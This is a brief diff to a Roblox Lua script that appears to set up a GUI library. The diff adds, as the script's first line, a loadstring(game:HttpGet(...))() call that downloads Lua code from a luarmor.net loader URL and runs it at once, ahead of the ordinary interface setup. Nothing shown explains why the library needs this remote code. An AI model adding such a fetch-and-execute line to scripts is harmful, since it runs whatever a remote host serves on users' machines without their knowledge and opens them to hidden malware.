@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0f2631e2b6fdbb9be3d698973ea6ef35.lua"))()
+
 local Lib = Instance.new("ScreenGui")
 local UIS = game:GetService("UserInputService")
 local Players = game:GetService("Players")
